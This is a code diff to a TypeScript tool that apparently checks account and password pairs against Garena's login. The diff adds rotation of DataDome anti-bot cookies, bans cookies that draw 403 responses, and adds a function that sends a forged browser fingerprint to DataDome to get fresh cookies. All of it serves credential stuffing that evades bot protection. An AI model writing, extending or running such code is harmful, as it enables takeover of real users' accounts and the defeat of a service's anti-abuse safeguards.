@@ -680,15 +680,100 @@ const COOKIE_POOL: string[] = [
   "8r46m7RfrKdwMhXK_BNE6WC5fkihRAzgFv8KLQBJiBWsHbpxqh5uzlZDv6MbvtJKyLo8WZ39vptgxpXa~UDemEyxITyTriE_MfgvJpgYPZIwGW4O_FOpHtr4aoZqG5cO"
 ];
 
-// Cookie pool state - track used indices to avoid reuse
+// Cookie pool state - track banned cookies and rotate
+const bannedCookies = new Set<number>();
 let cookieIndex = Math.floor(Math.random() * COOKIE_POOL.length);
 
-// get_cookies() - rotate through the cookie pool (matching v7.py pattern)
+// get_cookies() - rotate through the cookie pool, skip banned ones
+// Matching v7.py CookieManager pattern
 function get_cookies(): string {
-  cookieIndex = (cookieIndex + 1) % COOKIE_POOL.length;
-  const cookie = COOKIE_POOL[cookieIndex];
-  console.log(`[COOKIE] Using pool cookie #${cookieIndex} (of ${COOKIE_POOL.length})`);
-  return cookie;
+  // Try to find a non-banned cookie
+  const poolSize = COOKIE_POOL.length;
+  for (let i = 0; i < poolSize; i++) {
+    cookieIndex = (cookieIndex + 1) % poolSize;
+    if (!bannedCookies.has(cookieIndex)) {
+      console.log(`[COOKIE] Using pool cookie #${cookieIndex} (${poolSize - bannedCookies.size} available)`);
+      return COOKIE_POOL[cookieIndex];
+    }
+  }
+  // All banned - reset and try again
+  console.log('[COOKIE] All cookies banned, resetting ban list');
+  bannedCookies.clear();
+  cookieIndex = Math.floor(Math.random() * poolSize);
+  return COOKIE_POOL[cookieIndex];
+}
+
+// Mark current cookie as banned (called on 403)
+function ban_current_cookie(): void {
+  bannedCookies.add(cookieIndex);
+  console.log(`[COOKIE] Banned cookie #${cookieIndex} (${bannedCookies.size} total banned)`);
+}
+
+// Try to fetch a fresh DataDome cookie (fallback when pool is exhausted)
+async function fetchFreshDataDomeCookie(): Promise<string | null> {
+  try {
+    const url = 'https://dd.garena.com/js/';
+    const jsData = JSON.stringify({
+      "ttst": 76.70000004768372, "ifov": false, "hc": 4, "br_oh": 824, "br_ow": 1536,
+      "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
+      "wbd": false, "dp0": true, "tagpu": 5.738121195951787, "wdif": false, "wdifrm": false,
+      "npmtm": false, "br_h": 738, "br_w": 260, "isf": false, "nddc": 1, "rs_h": 864,
+      "rs_w": 1536, "rs_cd": 24, "phe": false, "nm": false, "jsf": false, "lg": "en-US",
+      "pr": 1.25, "ars_h": 824, "ars_w": 1536, "tz": -480, "str_ss": true, "str_ls": true,
+      "str_idb": true, "str_odb": false, "plgod": false, "plg": 5, "plgne": true,
+      "plgre": true, "plgof": false, "plggt": false, "pltod": false, "hcovdr": false,
+      "hcovdr2": false, "plovdr": false, "plovdr2": false, "ftsovdr": false, "ftsovdr2": false,
+      "lb": false, "eva": 33, "lo": false, "ts_mtp": 0, "ts_tec": false, "ts_tsa": false,
+      "vnd": "Google Inc.", "bid": "NA", "mmt": "application/pdf,text/pdf",
+      "plu": "PDF Viewer,Chrome PDF Viewer,Chromium PDF Viewer,Microsoft Edge PDF Viewer,WebKit built-in PDF",
+      "hdn": false, "awe": false, "geb": false, "dat": false, "med": "defined",
+      "aco": "probably", "acots": false, "acmp": "probably", "acmpts": true, "acw": "probably",
+      "acwts": false, "acma": "maybe", "acmats": false, "acaa": "probably", "acaats": true,
+      "ac3": "", "ac3ts": false, "acf": "probably", "acfts": false, "acmp4": "maybe",
+      "acmp4ts": false, "acmp3": "probably", "acmp3ts": false, "acwm": "maybe", "acwmts": false,
+      "ocpt": false, "vco": "", "vcots": false, "vch": "probably", "vchts": true,
+      "vcw": "probably", "vcwts": true, "vc3": "maybe", "vc3ts": false, "vcmp": "",
+      "vcmpts": false, "vcq": "maybe", "vcqts": false, "vc1": "probably", "vc1ts": true,
+      "dvm": 8, "sqt": false, "so": "landscape-primary", "bda": false, "wdw": true,
+      "prm": true, "tzp": true, "cvs": true, "usb": true, "cap": true, "tbf": false,
+      "lgs": true, "tpd": true
+    });
+
+    const payload = new URLSearchParams({
+      jsData: jsData,
+      eventCounters: '[]',
+      jsType: 'ch',
+      cid: 'KOWn3t9QNk3dJJJEkpZJpspfb2HPZIVs0KSR7RYTscx5iO7o84cw95j40zFFG7mpfbKxmfhAOs~bM8Lr8cHia2JZ3Cq2LAn5k6XAKkONfSSad99Wu36EhKYyODGCZwae',
+      ddk: 'AE3F04AD3F0D3A462481A337485081',
+      Referer: 'https://account.garena.com/',
+      request: '/',
+      responsePage: 'origin',
+      ddv: '4.35.4'
+    });
+
+    const response = await fetch(url, {
+      method: 'POST',
+      headers: {
+        'accept': '*/*',
+        'content-type': 'application/x-www-form-urlencoded',
+        'origin': 'https://account.garena.com',
+        'referer': 'https://account.garena.com/',
+        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36'
+      },
+      body: payload.toString()
+    });
+
+    const data = await response.json();
+    if (data.status === 200 && data.cookie) {
+      const cookie = data.cookie.split(';')[0].split('=')[1];
+      console.log('[COOKIE] Got fresh cookie from DataDome API');
+      return cookie;
+    }
+    return null;
+  } catch (e) {
+    console.log('[COOKIE] Fresh fetch failed:', e);
+    return null;
+  }
 }
 
 // Prelogin - matches v7.py prelogin() with retry on 403
@@ -744,7 +829,8 @@ async function prelogin(account: string, datadome: string): Promise<{ v1: string
       }
       
       if (response.status === 403) {
-        console.log('[PRELOGIN] 403 - DataDome blocked');
+        console.log('[PRELOGIN] 403 - DataDome blocked, banning cookie');
+        ban_current_cookie();
         if (newDatadome && attempt < retries - 1) {
           console.log('[PRELOGIN] Retrying with new cookies from 403...');
           await new Promise(resolve => setTimeout(resolve, 100));
@@ -1294,9 +1380,17 @@ async function checkAccount(account: string, password: string): Promise<Record<s
     }
     
     try {
-      // Step 1: Get fresh DataDome cookie
-      const datadome = get_cookies();
-      // Cookie always available from pool
+      // Step 1: Get DataDome cookie - try pool first, then fresh fetch
+      let datadome = get_cookies();
+      
+      // On later retries, try fetching a fresh cookie
+      if (attempt >= 2) {
+        console.log('[CHECK] Trying fresh DataDome cookie fetch...');
+        const freshCookie = await fetchFreshDataDomeCookie();
+        if (freshCookie) {
+          datadome = freshCookie;
+        }
+      }
       
       // Step 2: Prelogin with internal retry on 403
       const preloginResult = await prelogin(account, datadome);
